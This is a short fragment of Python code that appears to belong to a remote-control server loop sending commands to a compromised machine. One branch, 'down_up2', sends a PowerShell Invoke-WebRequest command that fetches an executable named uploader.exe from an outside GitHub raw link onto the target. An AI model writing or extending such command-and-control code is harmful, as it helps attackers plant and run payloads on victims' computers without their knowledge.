...
while True:
	...
	elif command_to_send == "down_up2":
		command_to_send = 'powershell;Invoke-WebRequest -Uri "https://github.com/jonathanbreitg/dump/blob/main/uploader.exe?raw=true" -OutFile "uploader.exe"'
